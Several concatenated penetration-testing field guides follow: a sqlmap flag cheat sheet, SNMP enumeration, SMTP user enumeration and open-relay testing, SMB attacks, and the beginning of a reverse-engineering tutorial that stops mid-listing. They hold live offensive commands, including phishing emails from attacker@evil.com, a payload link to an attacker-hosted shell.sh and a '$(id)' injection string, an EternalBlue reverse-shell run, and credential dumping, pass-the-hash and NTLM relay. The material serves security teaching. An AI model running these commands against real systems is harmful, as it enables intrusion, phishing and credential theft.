- `--columns` | `-c` select cols | `--dump` | `--dump-all`
- `--current-db` | `--current-user` | `--is-dba`
- `--level` 1–5 | `--risk` 1–3 | `--technique` beustq
- `--dbms` force engine | `--batch` no prompts | `--threads`
- `--tamper` waf bypass | `--proxy` burp | `--delay`
- `--os-shell` os cmd | `--sql-shell` sql cmd
- `--file-read` read file | `--file-write` + `--file-dest` write file

**quick one-liner dump:**
`sqlmap -r req.txt --batch --level=3 --dbs && sqlmap -r req.txt --batch -d target -t users --dump`

title: SNMP – Network Intelligence & Enumeration
summary: SNMP exposes a wealth of device info — system details, interfaces, running processes, installed software. Learn to query it, brute-force community strings, and
body:
snmp – network intelligence & enumeration snmp exposes a wealth of device info — system details, interfaces, running processes, installed software. learn to query it, brute-force community strings, and extract data for both ops and offensive use. tools snmp enumeration network pentesting what is snmp? **simple network management protocol (snmp)** is a udp-based protocol for monitoring and managing network devices — routers, switches, servers, printers, iot hardware. it runs on **port 161 (queries)** and **port 162 (traps/notifications)**.

devices expose a **mib (management information base)** — a tree of oids (object identifiers) that map to readable values like hostname, uptime, interfaces, routes, running processes, and installed software. snmp versions **v1 and v2c** are still extremely common. community strings (`public`, `private`) act as passwords and are transmitted in cleartext — anyone on the network can capture them with wireshark. tool overview snmpwalk – walk the mib `snmpwalk` queries all oids under a given subtree recursively. # walk everything (v2c, community string 'public')
snmpwalk -v2c -c public 192.168.1.1

# walk a specific oid subtree
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.1    # system info
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.4 # running processes
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.6 # installed software
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1.77   # windows user accounts

# use mib names instead of numeric oids
snmpwalk -v2c -c public -m all 192.168.1.1 sysdescr

# snmpv3 with auth + encryption
snmpwalk -v3 -l authpriv -u admin -a sha -a 'authpass' -x aes -x 'privpass' 192.168.1.1 key oids to know snmpget – single oid query # get system description
snmpget -v2c -c public 192.168.1.1 1.3.6.1.2.1.1.1.0

# get hostname
snmpget -v2c -c public 192.168.1.1 sysname.0

# get uptime
snmpget -v2c -c public 192.168.1.1 sysuptimeinstance onesixtyone – community string brute-force when the community string is unknown, `onesixtyone` tries a wordlist rapidly. # single target with a wordlist
onesixtyone -c /usr/share/seclists/discovery/snmp/common-snmp-community-strings.txt 192.168.1.1

# scan a subnet
onesixtyone -c community.txt -i hosts.txt

# quick test of common defaults
onesixtyone 192.168.1.1 public private manager

# using rockyou-style list
cat /usr/share/wordlists/rockyou.txt | head -1000 > /tmp/snmp-words.txt
onesixtyone -c /tmp/snmp-words.txt 192.168.1.1 snmp-check – formatted enumeration `snmp-check` organizes output into readable sections: system info, network, processes, storage, software. # basic enumeration
snmp-check 192.168.1.1

# specify version and community string
snmp-check -v 2c -c private 192.168.1.1

# verbose output (more detail)
snmp-check -v 2c -c public -d 192.168.1.1

# save to file
snmp-check 192.168.1.1 | tee snmp-enum.txt nmap nse scripts # discover snmp and check community strings
nmap -su -p 161 --script snmp-brute 192.168.1.1

# full info dump with known community string
nmap -su -p 161 --script snmp-info 192.168.1.1

# enumerate network interfaces
nmap -su -p 161 --script snmp-interfaces 192.168.1.1

# get running processes
nmap -su -p 161 --script snmp-processes 192.168.1.1

# list open tcp ports on target via snmp
nmap -su -p 161 --script snmp-netstat 192.168.1.1

# run all snmp scripts at once
nmap -su -p 161 --script snmp-* 192.168.1.1

# snmp udp discovery across subnet
nmap -su -p 161 --open 192.168.1.0/24 snmpbulkwalk – faster enumeration # bulk walk is faster than snmpwalk for large mibs
snmpbulkwalk -v2c -c public -cn0 -cr10 192.168.1.1

# walk specific subtree fast
snmpbulkwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25

# output only values (no oid names)
snmpbulkwalk -v2c -c public -ov 192.168.1.1 sysdescr snmpset – write values if the community string allows writes (usually `private`), you can modify device configuration remotely. # change system contact (string type 's')
snmpset -v2c -c private 192.168.1.1 syscontact.0 s 'admin@corp.com'

# change hostname
snmpset -v2c -c private 192.168.1.1 sysname.0 s 'new-hostname'

# type codes: i=integer, s=string, x=hex, o=oid, t=timeticks write access via snmp can allow device reconfiguration, interface shutdown, or firmware changes on managed switches and routers. always confirm authorization before using `snmpset` in production environments. extracting useful data # pull running processes and filter for interesting ones
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2 | grep -ie 'sql|ftp|ssh|web|apache|nginx|tomcat'

# list all installed software versions
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.25.6.3.1.2

# dump windows users (microsoft mib)
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.4.1.77.1.2.25

# get all ip addresses configured on device
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.20.1.1

# routing table
snmpwalk -v2c -c public 192.168.1.1 1.3.6.1.2.1.4.21 real-world use cases **network operations / monitoring**
- poll switch/router uptime, interface errors, and bandwidth via snmp to feed into grafana / prometheus / prtg
- discover all devices on a subnet and map their hostnames and software versions for an asset inventory
- monitor cpu/memory on servers without installing agents — many hypervisors and nas devices expose health via snmp
- receive snmp traps (port 162) for real-time alerts: link down, high temperature, disk failure **penetration testing / internal assessment**
- after finding open udp 161, walk the mib to enumerate os version, hostname, running services, and user accounts without any credentials
- extract routing tables to map internal network segments that aren't directly reachable from your foothold
- find software versions in the installed software list and cross-reference with cve databases
- discover credentials or sensitive data exposed in custom mib extensions (sysdescr fields sometimes contain config snippets) ctf / htb workflow # step 1: confirm snmp is open
nmap -su -p 161 --open <target>

# step 2: try default community strings
onesixtyone -c /usr/share/seclists/discovery/snmp/common-snmp-community-strings.txt <target>

# step 3: full walk with discovered community string
snmpwalk -v2c -c <community> <target> > snmp-full.txt

# step 4: hunt for juicy data
grep -ie 'pass|key|secret|token|user|admin|flag' snmp-full.txt

# step 5: windows-specific — users and shares
snmpwalk -v2c -c <community> <target> 1.3.6.1.4.1.77.1.2.25    # users
snmpwalk -v2c -c <community> <target> 1.3.6.1.4.1.77.1.2.27    # shares

# step 6: check if write access is possible
snmpset -v2c -c private <target> sysname.0 s 'test' 2>&1 - community strings found in ctfs are often machine names, challenge themes, or simple dictionary words — try `onesixtyone` with seclists first
- windows boxes: the microsoft mib (`1.3.6.1.4.1.77`) often leaks local user accounts and group memberships
- check `sysdescr` and `syscontact` fields — admins sometimes store notes, emails, or version info there
- if snmp v3 is used, nmap `snmp-brute` can try credential pairs from a wordlist quick reference **common community strings:** `public`, `private`, `manager`, `community`, `cisco`, `router`, `switch`

**key flags:**
- `-v1` / `-v2c` / `-v3` — snmp version
- `-c <string>` — community string
- `-m all` — load all mibs (use named oids)
- `-ov` — output values only
- `-t 1 -r 0` — reduce timeout/retries for fast scanning

**ports:** udp 161 (polling), udp 162 (traps)

**one-liner full enum:**
`snmp-check -v 2c -c public <target> | tee snmp.txt && grep -ie 'user|pass|admin' snmp.txt`

title: SMTP — Field Guide
summary: Banner grabbing, user enumeration via VRFY/RCPT, open relay testing with swaks, and a CTF workflow for turning an open relay into code execution.
body:
smtp — field guide banner grabbing, user enumeration via vrfy/rcpt, open relay testing with swaks, and a ctf workflow for turning an open relay into code execution. tools smtp email enumeration tools network what is smtp smtp (*simple mail transfer protocol*) handles outbound email delivery — sending mail from client to server and between servers. **ports:** for pentesters, smtp is interesting for three reasons: **user enumeration** via `vrfy`/`rcpt to`, **open relay testing** (can the server forward mail for any domain?), and **phishing/spoofing** when found on an internal network. manual connection smtp is a plain-text protocol — you can speak it directly with `nc` or `telnet`. understanding the raw commands is essential for both debugging and exploitation. nc -nv 10.10.10.5 25 # server responds with banner, e.g.: # 220 mail.example.com esmtp postfix ehlo attacker.com # introduce yourself, list supported extensions helo attacker.com # older, simpler version of ehlo # check if a user exists vrfy root # verify a username vrfy admin@example.com # expand a mailing list expn support # send an email manually mail from: rcpt to: data subject: test from: attacker@evil.com to: victim@example.com this is a test email. . quit **key smtp response codes:** nmap smtp scripts # service version + banner nmap -sv -p 25,465,587 10.10.10.5 # list supported smtp commands (ehlo extensions) nmap -p 25 --script smtp-commands 10.10.10.5 # enumerate users via vrfy, expn, rcpt nmap -p 25 --script smtp-enum-users 10.10.10.5 nmap -p 25 --script smtp-enum-users \ --script-args smtp-enum-users.userlist=/usr/share/wordlists/metasploit/unix_users.txt \ 10.10.10.5 # check for open relay nmap -p 25 --script smtp-open-relay 10.10.10.5 # check for ntlm info disclosure nmap -p 25 --script smtp-ntlm-info 10.10.10.5 # run all smtp scripts at once nmap -p 25 --script smtp-* 10.10.10.5 user enumeration many smtp servers respond differently to valid vs. invalid recipients, leaking valid usernames through `vrfy`, `expn`, or `rcpt to` responses. **three enumeration methods:** - **`vrfy`** — asks the server to verify a user exists. often disabled but worth trying. - **`expn`** — expands a mailing list into addresses. usually disabled. - **`rcpt to`** — most reliable; tests whether the server accepts delivery for that address. a `250` means valid, `550` means not found. # install if needed sudo apt install smtp-user-enum # vrfy method smtp-user-enum -m vrfy -u /usr/share/wordlists/metasploit/unix_users.txt -t 10.10.10.5 # expn method smtp-user-enum -m expn -u userlist.txt -t 10.10.10.5 # rcpt method (most reliable) smtp-user-enum -m rcpt -u userlist.txt -d example.com -t 10.10.10.5 # custom port smtp-user-enum -m vrfy -u userlist.txt -t 10.10.10.5 -p 587 # single user check smtp-user-enum -m vrfy -u root -t 10.10.10.5 # quick vrfy loop with netcat for user in root admin mail www-data postmaster; do echo -e "vrfy $user\nquit" | nc -w 3 10.10.10.5 25 2>/dev/null \ | grep -v '^220\|^221' | awk -v u=$user '{print u": "$0}' done # rcpt to loop — more reliable for user in root admin mail www-data; do result=$(echo -e "ehlo test\nmail from:\nrcpt to:<$user@example.com>\nquit" \ | nc -w 3 10.10.10.5 25 2>/dev/null | grep '^250\|^550') echo "$user: $result" done swaks — send test emails `swaks` (*swiss army knife for smtp*) is the best tool for sending test emails and probing smtp servers. it handles auth, tls, attachments, and custom headers — all from the command line. # send a basic test email swaks --to victim@example.com --from attacker@evil.com --server 10.10.10.5 # send with authentication swaks --to user@example.com --from user@example.com \ --server 10.10.10.5 --port 587 \ --auth login --auth-user user@example.com --auth-password 'password123' # send over tls swaks --to user@example.com --from attacker@evil.com \ --server mail.example.com --port 587 --tls # custom headers and body — useful for phishing tests swaks --to victim@example.com \ --from 'it support ' \ --server 10.10.10.5 \ --header 'subject: password reset required' \ --body 'click here: http://attacker.com/reset' # send with an attachment swaks --to victim@example.com --from attacker@evil.com \ --server 10.10.10.5 \ --attach /tmp/payload.pdf \ --header 'subject: invoice' # probe open relay — try to relay to an external address swaks --to external@gmail.com --from nobody@nobody.com --server 10.10.10.5 open relay testing an **open relay** accepts mail from anyone to anyone — no authentication required. once the default for all smtp servers, now a critical misconfiguration that gets servers blacklisted and abused for spam. test by attempting to relay from an external sender to an external recipient through the target server. if it accepts, it's an open relay. # manual test with netcat nc -nv 10.10.10.5 25 ehlo test.com mail from: rcpt to: # 250 = open relay (bad) # 550/554 = relay denied (expected) # automated with nmap nmap -p 25 --script smtp-open-relay 10.10.10.5 # automated with swaks swaks --to test@gmail.com --from fake@attacker.com --server 10.10.10.5 \ --quit-after rcpt --hide-all # exit code 0 = accepted (open relay) sending email with python useful for automating phishing simulations, alert scripts, or ctf exploit chains that need to send email: import smtplib from email.mime.text import mimetext from email.mime.multipart import mimemultipart # basic unauthenticated send (open relay / internal server) def send_plain(smtp_host, sender, recipient, subject, body): msg = mimemultipart() msg['from'] = sender msg['to'] = recipient msg['subject'] = subject msg.attach(mimetext(body, 'plain')) with smtplib.smtp(smtp_host, 25, timeout=10) as s: s.sendmail(sender, recipient, msg.as_string()) # authenticated send (port 587 + starttls) def send_auth(host, user, password, recipient, subject, body): msg = mimetext(body) msg['subject'] = subject msg['from'] = user msg['to'] = recipient with smtplib.smtp(host, 587) as s: s.ehlo() s.starttls() s.login(user, password) s.sendmail(user, recipient, msg.as_string()) # example send_plain('10.10.10.5', 'attacker@evil.com', 'admin@target.com', 'test', 'internal relay confirmed.') real-world use cases **verify email deliverability** — debug why emails land in spam: # check mx records for the target domain dig mx example.com +short # test connection to the mail server directly swaks --to test@example.com --server $(dig mx example.com +short | sort -n | head -1 | awk '{print $2}') # check if your sending ip is blacklisted dig +short $(echo '5.10.10.10' | awk -f. '{print $4"."$3"."$2"."$1}').zen.spamhaus.org # verify spf record accepts your sending ip dig txt example.com +short | grep spf # test starttls support swaks --to test@example.com --server mail.example.com --port 587 --tls --quit-after ehlo **phishing simulation** — authorized red team test sending a crafted email internally: # spoof sender via internal open relay swaks \ --to employee@company.com \ --from 'ceo ' \ --server 10.0.0.25 \ --header 'subject: urgent: action required' \ --body 'please review: http://phish.redteam.lab/reset' # with html body swaks \ --to employee@company.com \ --from 'it helpdesk ' \ --server 10.0.0.25 \ --header 'subject: password expiry notice' \ --header 'content-type: text/html' \ --body '

your password expires today. reset here.

' ctf & hackthebox workflow smtp on ctf boxes typically leads to one of: valid usernames to spray against ssh/ftp, an open relay to deliver a payload, or credentials found in config files that unlock the mail server. export ip=10.10.10.5 # 1. banner grab + supported commands nc -nv $ip 25 nmap -p 25 --script smtp-commands $ip # 2. check for ntlm info disclosure (leaks hostname, domain) nmap -p 25 --script smtp-ntlm-info $ip # 3. user enumeration — try all three methods smtp-user-enum -m vrfy -u /usr/share/wordlists/metasploit/unix_users.txt -t $ip smtp-user-enum -m expn -u /usr/share/wordlists/metasploit/unix_users.txt -t $ip smtp-user-enum -m rcpt -u /usr/share/wordlists/metasploit/unix_users.txt -d $(nmap -p 25 --script smtp-commands $ip | grep 'hello' | grep -op 'hello \k\s+') -t $ip # 4. test open relay nmap -p 25 --script smtp-open-relay $ip # 5. if open relay — send a payload to an internal user swaks --to admin@example.htb --from root@localhost --server $ip \ --body 'http://10.10.14.5/shell.sh' \ --header 'subject: check this out' # common scenario: web app processes emails, open relay lets you trigger it # deliver a malicious link or attachment to a user that clicks everything swaks --to developer@example.htb \ --from support@example.htb \ --server $ip \ --header 'subject: new ticket assigned' \ --body 'review ticket: http://10.10.14.5/?$(id)' # or send with a file attachment (e.g. a .odt with macro, csv injection) swaks --to developer@example.htb --from noreply@example.htb \ --server $ip \ --attach /tmp/payload.odt \ --header 'subject: monthly report' **`nc -nv ip 25`** — always start with a raw connection to read the banner. **`vrfy` → `expn` → `rcpt to`** — try each method for user enum; rcpt is most reliable. **`smtp-user-enum -m rcpt`** needs a domain (`-d`) to build full addresses. **`swaks`** is the best tool for actually sending test emails and checking relay. **ntlm info disclosure** (`smtp-ntlm-info`) leaks hostname and domain — useful for ad boxes. **port 587** requires auth; **port 25** is where open relays live on internal networks.

title: SMB — Field Guide
summary: Null sessions, share enumeration, pass-the-hash, and a full CTF workflow covering smbclient, smbmap, enum4linux, CrackMapExec, Impacket, EternalBlue, and Respon
body:
smb — field guide null sessions, share enumeration, pass-the-hash, and a full ctf workflow covering smbclient, smbmap, enum4linux, crackmapexec, impacket, eternalblue, and responder. tools smb enumeration windows tools active-directory what is smb smb (*server message block*) is the windows file-sharing protocol. it runs on **port 445** (direct) and port 139 (over netbios). it handles file shares, printers, named pipes, and windows authentication.

for attackers and pentesters, smb is one of the most valuable services on a network — it leaks usernames, hashes, shares, os versions, and domain info, and has a long history of critical vulnerabilities (eternalblue, printnightmare, petitpotam).

**main tools:** initial recon # check if smb is open
nmap -p 139,445 10.10.10.5

# os + smb version detection
nmap -p 445 --script smb-os-discovery 10.10.10.5

# full smb enumeration with nse
nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode 10.10.10.5

# vulnerability scan
nmap -p 445 --script smb-vuln-* 10.10.10.5

# check for eternalblue (ms17-010)
nmap -p 445 --script smb-vuln-ms17-010 10.10.10.5 smbclient `smbclient` is the built-in kali/linux smb client — think of it as ftp for windows shares. it connects to individual shares and gives you an interactive prompt. # list available shares (null session — no credentials)
smbclient -l //10.10.10.5 -n

# list shares with credentials
smbclient -l //10.10.10.5 -u 'user%password'

# connect to a specific share
smbclient //10.10.10.5/share -n
smbclient //10.10.10.5/c$ -u 'administrator%password123'

# pass-the-hash (no plaintext password needed)
smbclient //10.10.10.5/c$ -u 'administrator' --pw-nt-hash <ntlm_hash>

# specify domain
smbclient //10.10.10.5/share -u 'domain\user%password' smb: \> ls                    # list files
smb: \> ls -la                # list including hidden files
smb: \> cd documents          # change directory
smb: \> get passwords.txt     # download a file
smb: \> put shell.exe         # upload a file
smb: \> mget *                # download everything
smb: \> prompt off            # disable per-file confirmation
smb: \> recurse on            # enable recursive listing/download
smb: \> mget *                # download all files recursively
smb: \> mkdir loot            # create a directory
smb: \> del old.txt           # delete a file
smb: \> exit # download a single file non-interactively
smbclient //10.10.10.5/share -n -c 'get flag.txt'

# download entire share recursively
smbclient //10.10.10.5/share -n -c 'prompt off; recurse on; mget *' smbmap `smbmap` shows you **all shares and their permissions** at a glance — read, write, or no access. much faster than connecting to each share manually. # null session — list shares and permissions
smbmap -h 10.10.10.5

# with credentials
smbmap -h 10.10.10.5 -u 'user' -p 'password'

# with ntlm hash
smbmap -h 10.10.10.5 -u 'administrator' -p '<ntlm_hash>' --no-pass

# list contents of a specific share
smbmap -h 10.10.10.5 -u 'user' -p 'password' -r share

# recursive listing
smbmap -h 10.10.10.5 -u 'user' -p 'password' -r share

# download a file
smbmap -h 10.10.10.5 -u 'user' -p 'password' --download 'share/path/file.txt'

# scan entire subnet
smbmap -h 10.10.10.0/24 -u 'user' -p 'password' enum4linux / enum4linux-ng `enum4linux` pulls everything smb and rpc have to offer in one shot: users, groups, shares, password policy, os info, and domain details.

`enum4linux-ng` is the modern rewrite — faster, cleaner output, json export. # full enumeration (null session)
enum4linux -a 10.10.10.5

# with credentials
enum4linux -a -u 'user' -p 'password' 10.10.10.5

# specific flags
enum4linux -u 10.10.10.5   # users only
enum4linux -s 10.10.10.5   # shares only
enum4linux -p 10.10.10.5   # password policy
enum4linux -g 10.10.10.5   # groups
enum4linux -o 10.10.10.5   # os info

# enum4linux-ng (recommended)
enum4linux-ng -a 10.10.10.5
enum4linux-ng -a -u 'user' -p 'password' 10.10.10.5
enum4linux-ng -a 10.10.10.5 -oj results   # save as json rpcclient `rpcclient` sends raw rpc commands. useful when you need specific info that higher-level tools don't expose — or when everything else is blocked. # connect (null session)
rpcclient -u '' -n 10.10.10.5

# connect with credentials
rpcclient -u 'user%password' 10.10.10.5

# inside rpcclient:
rpcclient $> srvinfo          # server info + os
rpcclient $> enumdomusers     # list domain users
rpcclient $> enumdomgroups    # list groups
rpcclient $> querydominfo     # domain info + password policy
rpcclient $> getdompwinfo     # password complexity policy
rpcclient $> enumprinters     # list printers
rpcclient $> netshareenumall  # list all shares

# one-liner (non-interactive)
rpcclient -u '' -n 10.10.10.5 -c 'enumdomusers' 2>/dev/null

# extract just usernames
rpcclient -u '' -n 10.10.10.5 -c 'enumdomusers' 2>/dev/null \
  | grep -op '\[.*?\]' | grep -v '0x' | tr -d '[]' crackmapexec / netexec cme (now `netexec`) is the fastest tool for credential testing, password spraying, and lateral movement at scale. install: `sudo apt install crackmapexec` or `pipx install netexec`. # test a single credential pair
crackmapexec smb 10.10.10.5 -u 'user' -p 'password'

# test across a subnet
crackmapexec smb 10.10.10.0/24 -u 'administrator' -p 'password123'

# password spray (one password, many users)
crackmapexec smb 10.10.10.5 -u users.txt -p 'password123' --continue-on-success

# pass-the-hash
crackmapexec smb 10.10.10.5 -u 'administrator' -h '<ntlm_hash>'

# list shares
crackmapexec smb 10.10.10.5 -u 'user' -p 'password' --shares

# execute a command (requires admin)
crackmapexec smb 10.10.10.5 -u 'administrator' -p 'password' -x 'whoami'

# dump sam hashes (local admin required)
crackmapexec smb 10.10.10.5 -u 'administrator' -p 'password' --sam

# dump lsa secrets
crackmapexec smb 10.10.10.5 -u 'administrator' -p 'password' --lsa

# check for null sessions across subnet
crackmapexec smb 10.10.10.0/24 -u '' -p '' impacket impacket is a python library with standalone scripts for smb exploitation, hash dumping, and remote execution. lives in `/usr/share/doc/python3-impacket/examples/` or installed as `impacket-*` commands on kali. # psexec — remote shell via smb (requires admin + writable share)
impacket-psexec administrator:password123@10.10.10.5
impacket-psexec -hashes :<ntlm_hash> administrator@10.10.10.5

# smbexec — stealthier remote exec (uses service, no file drop)
impacket-smbexec administrator:password123@10.10.10.5

# wmiexec — exec via wmi (even stealthier, no service install)
impacket-wmiexec administrator:password123@10.10.10.5

# secretsdump — dump sam, lsa, ntds.dit hashes remotely
impacket-secretsdump administrator:password123@10.10.10.5
impacket-secretsdump -hashes :<ntlm_hash> administrator@10.10.10.5

# smbclient.py — impacket's own smb client
impacket-smbclient administrator:password123@10.10.10.5

# lookupsid — brute-force sid to enumerate users without creds
impacket-lookupsid anonymous@10.10.10.5 | grep sidtypeuser real-world use cases **internal audit — find exposed shares and sensitive files:** # map all smb shares and permissions across the subnet
smbmap -h 10.0.0.0/24 -u 'auditor' -p 'password'

# find sysvol/netlogon for gpp passwords (classic finding)
smbclient //10.0.0.5/sysvol -u 'user%password'
smb: \> recurse on
smb: \> prompt off
smb: \> mget *   # look for groups.xml, services.xml, etc.

# search shares for sensitive filenames
crackmapexec smb 10.0.0.5 -u 'user' -p 'password' -m spider_plus **mount an smb share on linux:** sudo mkdir /mnt/share
sudo mount -t cifs //10.0.0.5/share /mnt/share \
  -o username=user,password=password,vers=3.0

# or add to /etc/fstab for persistent mount:
# //10.0.0.5/share /mnt/share cifs credentials=/etc/samba/creds,vers=3.0 0 0 ctf & hackthebox workflow on ctf/htb boxes, smb usually leads to credentials, flags, or a foothold. the typical flow: null session → share list → read files → find credentials → reuse creds → lateral movement or shell. export ip=10.10.10.5

# 1. check smb version + os
nmap -p 445 --script smb-os-discovery $ip

# 2. try null session share listing
smbclient -l //$ip -n
smbmap -h $ip

# 3. full enum with enum4linux-ng
enum4linux-ng -a $ip

# 4. browse readable shares
smbclient //$ip/sharename -n

# 5. dump everything from a readable share
smbclient //$ip/sharename -n -c 'prompt off; recurse on; mget *'

# 6. if you have credentials — check for admin access
crackmapexec smb $ip -u 'user' -p 'password'
# pwn3d! = local admin → can exec commands

# 7. vuln check
nmap -p 445 --script smb-vuln-ms17-010 $ip # check vulnerability first
nmap -p 445 --script smb-vuln-ms17-010 $ip

# metasploit
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set rhosts 10.10.10.5
set lhost 10.10.14.5
set payload windows/x64/shell_reverse_tcp
run # start responder on your network interface
sudo responder -i tun0 -v

# trigger a unc path from the victim (file upload, url, etc.)
# responder captures ntlmv2 hashes

# crack the captured hash offline
hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt
john captured.hash --wordlist=/usr/share/wordlists/rockyou.txt

# or relay the hash with ntlmrelayx (if smb signing is disabled)
impacket-ntlmrelayx -tf targets.txt -smb2support **always try null sessions first** — `smbclient -l //ip -n` and `smbmap -h ip`.  
**`crackmapexec`** is the fastest way to test creds across a subnet.  
**pwn3d!** in cme output = local admin rights = can dump hashes and exec commands.  
**`impacket-secretsdump`** dumps everything remotely without dropping a binary.  
**check sysvol** for gpp passwords (`cpassword` in `.xml` files) — still common.  
**smb signing disabled?** that's a relay attack waiting to happen — check with cme: `--gen-relay-list`.

title: Reverse Engineering 101 — Reading What the Compiler Wrote
summary: Reverse engineering demystified. Covers static vs dynamic analysis, essential tools, x86/x64 assembly fundamentals, reading decompiler output, patching binaries
body:
reverse engineering 101 — reading what the compiler wrote reverse engineering demystified. covers static vs dynamic analysis, essential tools, x86/x64 assembly fundamentals, reading decompiler output, patching binaries, unpacking, and a worked malware analysis walkthrough — from running sample to extracted c2 address. learn reverse-engineering malware-analysis assembly ghidra ida x64dbg binary-analysis exploit-dev reverse engineering is reading a program that has no source code. every compiled binary is a message the compiler left — assembly instructions, memory layout, data structures, control flow. learn to read it and you can understand what any program does: malware, closed-source software, firmware, drivers, proprietary protocols.

for security practitioners, re is the skill that separates operators who can analyse what they find from operators who have to rely on someone else's write-up. you cannot fully defend against what you cannot understand. you cannot responsibly exploit what you have not analysed. this guide builds the foundation from first principles. static vs dynamic analysis never run unknown malware on your host machine or any machine connected to a production network. use a dedicated vm with network isolation — block all outbound except to your own lab dns/c2 catcher (inetsim, fakenet-ng). revert to a clean snapshot before each analysis session. some malware detects vms and behaves differently — disable vmware guest additions and common vm artefacts. essential tools setup # linux/kali — static analysis tools
apt install ghidra radare2 binutils file xxd strings -y
pip3 install pefile capstone pyelftools r2pipe

# ghidra (nsa's free decompiler — excellent for most work)
# download from ghidra-sre.org
# requires java 17+: apt install openjdk-17-jdk
# launch: ./ghidrarun

# radare2 — command line re framework
r2 ./sample.exe           # open binary
aaa                        # analyse all (takes time on large binaries)
afl                        # list all functions
pdf @ main                 # disassemble main function
vv                         # visual graph mode
pdc @ main                 # pseudo-c decompiler (r2dec plugin)

# strings extraction — first thing to run on any sample
strings -n 6 sample.exe | less
strings -n 6 -e l sample.exe  # unicode (utf-16le) strings

# file identification
file sample.exe
exiftool sample.exe

# pe analysis
pestool --header sample.exe     # pe headers
pestool --imports sample.exe    # imported functions
pestool --exports sample.exe    # exported functions # windows — dynamic analysis setup

# x64dbg (free, excellent windows debugger)
# download: x64dbg.com — run x96launcher.exe

# process monitor (procmon) — file/registry/network activity
# from sysinternals suite: live.sysinternals.com/procmon.exe
# filter: process name → is → sample.exe

# api monitor — log all win32 api calls
# download: rohitab.com/apimonitor

# fakenet-ng — intercept and simulate network services
pip install flare-fakenet-ng
fakenet -l output.log

# cuckoo sandbox — automated dynamic analysis
# or use any.run / virustotal for quick cloud-based dynamic analysis
# (cloud = not private — don't submit client samples)

# flare vm — windows malware analysis workstation
# https://github.com/mandiant/flare-vm
# installs all tools with one script on a windows vm x86/x64 assembly fundamentals you do not need to memorise the entire x86 instruction set. you need to recognise the 30 instructions that appear in 90% of code. the rest you look up. data movement and arithmetic ; mov — move data (most common instruction)
mov eax, 0x10         ; eax = 0x10 (immediate value)
mov eax, [ebp-4]      ; eax = value at memory address (ebp - 4)
mov [esp+8], eax      ; write eax to memory at (esp + 8)

; lea — load effective address (compute pointer arithmetic)
lea eax, [ebp-0x50]   ; eax = (ebp - 0x50) — address, not value
                      ; commonly used for: getting address of local variable
                      ;                    fast multiply: lea eax,[eax+eax*4] = eax*5

; arithmetic
add eax, 4            ; eax = eax + 4
sub esp, 0x20         ; esp = esp - 32  (allocate stack space in function prologue)
imul eax, ecx, 3      ; eax = ecx * 3
inc ecx               ; ecx++
dec ecx               ; ecx--

; bitwise
xor eax, eax          ; eax = 0  (common idiom — faster than mov eax, 0)
and eax, 0xff         ; mask to lowest byte
or  eax, 0x100        ; set bit 8
shl eax, 2            ; eax <<= 2  (multiply by 4)
shr eax, 1            ; eax >>= 1  (divide by 2) control flow ; cmp — compare (sets eflags, does not store result)
cmp eax, 0            ; eax - 0, set zf if equal
cmp eax, ebx          ; eax - ebx

; conditional jumps (read the condition, not just 'jump')
jz  .label            ; jump if zf=1 (zero / equal)
jnz .label            ; jump if zf=0 (not zero / not equal)
jl  .label            ; jump if less (signed)
jg  .label            ; jump if greater (signed)
jle .label            ; jump if less or equal
jge .label            ; jump if greater or equal
jb  .label            ; jump if below (unsigned)
ja  .label            ; jump if above (unsigned)

; test — bitwise and, only sets flags
test eax, eax         ; if eax == 0: zf=1
jz .null_check        ; common null pointer check pattern

; unconditional
jmp .label            ; always jump
call function         ; push return address, jump to function
ret                   ; pop return address into eip/rip, jump

; the c → asm translation of an if statement:
; if (a == b) { do_something(); }
;  cmp eax, ebx
;  jnz .skip          ; if not equal, skip the body
;  call do_something
; .skip: stack operations and function calls ; standard x86 function prologue
push ebp              ; save caller's base pointer
mov  ebp, esp         ; establish new stack frame
sub  esp, 0x28        ; allocate 40 bytes for local variables

; standard epilogue
mov  esp, ebp         ; (or: leave — same thing)
pop  ebp
ret

; x64 calling convention (windows): rcx, rdx, r8, r9, then stack
; arguments:  1st=rcx  2nd=rdx  3rd=r8  4th=r9
; return value: rax
; x64 calling convention (linux sysv): rdi, rsi, rdx, rcx, r8, r9

; example: recognising strcmp in disassembly
; source: if (strcmp(s1, s2) == 0) { ... }
;
; lea  rcx, [s1]     ; 1st arg: s1
; lea  rdx, [s2]     ; 2nd arg: s2
; call strcmp
; test eax, eax      ; strcmp returns 0 if equal
; jnz  .not_equal working with ghidra ghidra's decompiler turns disassembly into readable pseudo-c. it is not perfect — names are lost, types are guessed, and complex patterns confuse it — but it dramatically reduces analysis time. ghidra workflow 1. new project → import file → auto-analysis (accept defaults)
2. open codebrowser → symbol tree → functions → main
3. decompiler window (right): pseudo-c — rename variables with 'l'
4. disassembly window (left): assembly — cross-references with 'x'
5. string search: search > for strings → click to navigate to usage
6. rename: right-click symbol → rename symbol (persists in project)
7. retype: right-click variable in decompiler → retype variable
8. cross-references: right-click function → references → show references
9. xref usage: see every caller of a function
10. script manager: run scripts (python/java) for automation common decompiler patterns to recognise /* ghidra decompiler output — before renaming */
void fun_00401000(void) {
    char *pcvar1;
    int ivar2;
    undefined local_54 [64];
    
    pcvar1 = (char *)fun_00405320(local_54, 0x40);  // suspicious
    ivar2 = fun_0040a0c0(pcvar1, "mssdk32.dll");    // strcmp-like
    if (ivar2 == 0) {
        fun_00408910(1);
    }
    fun_004012a0(local_54, &dat_00408000, 0x20);
    return;
}

/* after re work: renamed based on imports + behaviour analysis */
void check_and_load_module(void) {
    char module_name [64];
    int is_match;
    
    /* getmodulefilenamea writes into buffer */
    getmodulefilenamea(null, module_name, 0x40);
    is_match = strcmp(module_name, "mssdk32.dll");
    if (is_match == 0) {
        exitprocess(1);  /* self-terminate if run as a dll */
    }
    /* xor decryption of embedded payload */
